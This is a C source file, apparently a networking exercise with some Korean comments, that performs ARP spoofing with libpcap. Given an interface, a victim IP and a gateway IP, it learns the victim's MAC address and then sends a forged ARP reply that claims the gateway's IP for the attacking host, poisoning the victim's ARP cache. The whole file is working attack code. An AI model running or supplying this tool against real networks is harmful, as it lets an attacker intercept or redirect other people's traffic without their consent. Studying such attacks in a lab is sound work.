/* send ARP reply for ARP spoofing */
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>

#include <linux/if_ether.h>
#include <netinet/ether.h>

#include <sys/types.h>
#include <ifaddrs.h>
#include <netdb.h>
#include <arpa/inet.h>
#include <pcap.h>

#define IP_ADDR_LEN 4
#define IP_STR_BUF_LEN 16

#define MAC_ADDR_LEN 6
#define MAC_STR_BUF_LEN MAC_ADDR_LEN * 2 + 5 + 1
#define ETH_HEADER_SIZE 14 // 6 + 6 + 2

#define SYS_NET_PATH "/sys/class/net/%s/address"
#define SYS_NET_PATH_LEN 24
#define PROC_ARP_PATH "/proc/net/arp"
#define INT_NAME_MAX_LEN 15
#define ARP_TABLE_ENTRY_LEN 128

#define BROADCAST_ETH_STR   "ff:ff:ff:ff:ff:ff"
#define ARP_REQ_DST_MAC_STR "00:00:00:00:00:00"

#define ARP_REQUEST 0x0001
#define ARP_REPLY   0x0002

#define NI_MAXHOST 1025
#define NI_NUMERICHOST 1

typedef struct _eth_header
{
  uint8_t dst_addr[MAC_ADDR_LEN];
  uint8_t src_addr[MAC_ADDR_LEN];
  uint16_t ether_type; // next protocol type
} __attribute__((packed)) eth_header;

typedef struct _arp_packet
{
  uint16_t hd_type;
  uint16_t protocol_type;
  uint8_t hd_size;
  uint8_t protocol_size;
  uint16_t opcode;
  uint8_t src_mac[MAC_ADDR_LEN];
  uint32_t src_ip;
  uint8_t dst_mac[MAC_ADDR_LEN];
  uint32_t dst_ip;
} __attribute__((packed)) arp_packet;

typedef struct _eth_arp_packet
{
  eth_header eth;
  arp_packet arp;
  // uint8_t padding[18];
} __attribute__((packed)) eth_arp_packet;

void print_mac_addr(const char *, uint8_t *);
void print_packet(u_char *p);

void get_dev_mac(const char* dev, const char* mac_str);
void get_src_ip_str(const char* dev, char* host);
void get_mac_from_arp_req(pcap_t *handle, const char *ip_str, char* mac_str);

void fill_eth_header(eth_header *, const char *, const char *, uint16_t);
void fill_arp_packet(arp_packet *, const char *, const char *, const char *, const char *, uint16_t);

void usage(char *fname)
{
  printf("syntax: %s <interface> <sender ip(victim)> <target ip(gateway)>\n", fname);
  printf("sample: %s wlan0 192.168.110.129 192.168.110.1\n", fname);
}

int main(int argc, char *argv[]) {
  if (argc != 4)
  {
    usage(argv[0]);
    return -1;
  }
  char *dev = argv[1];
  char *victim_ip_str = argv[2];
  char *gateway_ip_str = argv[3];

  char errbuf[PCAP_ERRBUF_SIZE];
  pcap_t *handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
  if (handle == NULL)
  {
    fprintf(stderr, "couldn't open device %s: %s\n", dev, errbuf);
    return -1;
  }

  
  ////////////////////////// send ARP REQUEST
  eth_arp_packet packet;
  char src_ip_str[IP_STR_BUF_LEN];
  char src_mac_str[MAC_STR_BUF_LEN];
  get_src_ip_str(dev, src_ip_str);
  get_dev_mac(dev, src_mac_str);
  printf("this host's ip  : %s\n", src_ip_str);
  printf("this host's mac : %s\n", src_mac_str);

  fill_eth_header(&packet.eth, src_mac_str, BROADCAST_ETH_STR, ETH_P_ARP);
  fill_arp_packet(&packet.arp, src_mac_str, ARP_REQ_DST_MAC_STR, src_ip_str, victim_ip_str, ARP_REQUEST);
  // print_packet((u_char *)&packet);
  if (pcap_sendpacket(handle, (u_char *)&packet, sizeof(eth_arp_packet)) == -1)
  {
    fprintf(stderr, "[*] send error : %s\n", pcap_geterr(handle));
  }

  ///////////////// RECV ARP REPLY to get victim's mac
  char victim_mac_str[MAC_STR_BUF_LEN];
  get_mac_from_arp_req(handle, victim_ip_str, victim_mac_str);
  printf("victim's mac   : %s\n", victim_mac_str);

  ///////////////// SEND ARP REPLY ( ARP SPOOFING )
  fill_eth_header(&packet.eth, src_mac_str, victim_mac_str, ETH_P_ARP);
  fill_arp_packet(&packet.arp, src_mac_str, victim_mac_str, gateway_ip_str, victim_ip_str, ARP_REPLY);
  
  // print_mac_addr("src_mac : ", packet->eth.src_addr);
  // print_mac_addr("dst_mac : ", packet->eth.dst_addr);  
  print_packet((u_char*)&packet);
  
  if (pcap_sendpacket(handle, (u_char*)&packet, sizeof(eth_arp_packet)) == -1) {
      fprintf(stderr, "[*] send error : %s\n", pcap_geterr(handle));
  }
  
  pcap_close(handle);
  return 0;
}


void get_mac_from_arp_req(pcap_t *handle, const char *ip_str, char* mac_str) {
  while (true)
  {
    struct pcap_pkthdr *header;
    const u_char *recv_packet;

    int res = pcap_next_ex(handle, &header, &recv_packet);
    if (res == 0)    continue;
    if (res == -1 || res == -2)    break;
    eth_header *eth = (eth_header *)recv_packet;
    if (eth->ether_type == htons(ETH_P_ARP)) {
      print_packet((u_char*)recv_packet);
      arp_packet* arp = (arp_packet*)(recv_packet + ETH_HEADER_SIZE);
      // in this case, inet_ntoa is better than inet_ntop
      if (arp->opcode == htons(ARP_REPLY)) {
        struct in_addr src_ip;
        src_ip.s_addr = arp->src_ip;
        if (!strncmp(inet_ntoa(src_ip), ip_str, IP_STR_BUF_LEN - 1)) {
          strncpy(mac_str, ether_ntoa((ether_addr*)arp->src_mac), MAC_STR_BUF_LEN - 1);
          break;
        }
      }
    }
  }
}

void fill_eth_header(eth_header *eth, const char *src_mac_str, const char *dst_mac_str, uint16_t type)
{
  /** fill Ethernet header : MAC address 
   * output : (indirect) filled eth_header*
   * **/
  // or should I change ether_aton() -> ether_aton_r()?
  memcpy(&eth->src_addr, ether_aton(src_mac_str), MAC_ADDR_LEN);
  memcpy(&eth->dst_addr, ether_aton(dst_mac_str), MAC_ADDR_LEN);
  eth->ether_type = htons(type);
}

void fill_arp_packet(arp_packet *arp, const char *src_mac_str, const char *dst_mac_str,
                     const char *src_ip_str, const char *dst_ip_str, uint16_t opcode)
{
  /** fill ARP pakcet 
   * output : (indirect) filled arp_packet*
   * **/
  arp->hd_type = htons(1); // Ethernet일 경우 1
  arp->protocol_type = htons(ETH_P_IP);
  arp->hd_size = MAC_ADDR_LEN;
  arp->protocol_size = IP_ADDR_LEN;
  arp->opcode = htons(opcode);
  memcpy(&arp->src_mac, ether_aton(src_mac_str), MAC_ADDR_LEN);
  arp->src_ip = inet_addr(src_ip_str); // inet_aton()와 struct in_addr을 사용해도 된다.
  memcpy(&arp->dst_mac, ether_aton(dst_mac_str), MAC_ADDR_LEN);
  arp->dst_ip = inet_addr(dst_ip_str);
}

void get_src_ip_str(const char*dev, char* host)
{
  struct ifaddrs *ifaddr, *ifa;
  int family, s, n;

  if (getifaddrs(&ifaddr) == -1)
  {
    perror("getifaddrs");
    exit(EXIT_FAILURE);
  }

  for (ifa = ifaddr, n = 0; ifa != NULL; ifa = ifa->ifa_next, n++)
  {
    if (ifa->ifa_addr == NULL)
      continue;

    family = ifa->ifa_addr->sa_family;

    if (family == AF_INET)
    {
      s = getnameinfo(ifa->ifa_addr, sizeof(struct sockaddr_in),
                      host, NI_MAXHOST, NULL, 0, NI_NUMERICHOST);
      if (s != 0)
      {
        printf("getnameinfo() failed: %s\n", gai_strerror(s));
        exit(EXIT_FAILURE);
      }
      else if (!strncmp(ifa->ifa_name, dev, INT_NAME_MAX_LEN))
      {
        break;
      }
    }
  }
  // printf("\t\taddress: %s <%s>\n", ifa->ifa_name, host);
  freeifaddrs(ifaddr);
}

void get_dev_mac(const char* dev, const char* mac_str) {
  size_t mac_path_len = SYS_NET_PATH_LEN + strlen(dev);
  char mac_path[mac_path_len];
  snprintf(mac_path, mac_path_len, SYS_NET_PATH, dev);

  FILE *fp = fopen(mac_path, "r");
  if (!fp)
  {
    fprintf(stderr, "[*] fopen(%s) error\n", mac_path);
    exit(EXIT_FAILURE);
  }
  fscanf(fp, "%s", mac_str);
  fclose(fp);
}


void print_mac_addr(const char *str, uint8_t *a)
{
  printf("%s", str);
  printf("%02x:%02x:%02x:%02x:%02x:%02x\n", a[0], a[1], a[2], a[3], a[4], a[5]);
}

void print_packet(u_char *p)
{
  int i;
  for (i = 1; i < sizeof(eth_arp_packet); i++)
  {
    printf("%02x ", p[i - 1]);
    if (i % 16 == 0)
    {
      printf("\n");
    }
  }
  printf("%02x ", p[i]);
  printf("\n");
}



/////////////////////// unused func ///////////////////////////////
int get_mac_from_arp_table(const char* ip_str, const char* mac_str) {
  /**
   * input  : ip_str
   * output : mac_str (indirect)
   * return : 0, -1
   * */
  FILE *fp = fopen(PROC_ARP_PATH, "r");
  if (!fp)
  {
    fprintf(stderr, "[*] fopen(%s) error\n", PROC_ARP_PATH);
    return -1;
  }

  char column[ARP_TABLE_ENTRY_LEN];
  if (!fgets(column, sizeof(column), fp))
  {
    perror("[*] fgets error");
    return -1;
  }
  // printf("%s\n", column);

  char parsed_ip[IP_STR_BUF_LEN] = {0};
  fscanf(fp, "%s %*s %*s %s %*s %*s", parsed_ip, mac_str);
  while (strncmp(ip_str, parsed_ip, IP_STR_BUF_LEN - 1) != 0)
  {
    if (feof(fp) != 0)
    {
      fprintf(stderr, "[*] There is no %s entry in ARP table\n", ip_str);
      return -1;
    }
    fscanf(fp, "%s %*s %*s %s %*s %*s", parsed_ip, mac_str);
  }

  fclose(fp);
  return 0;
}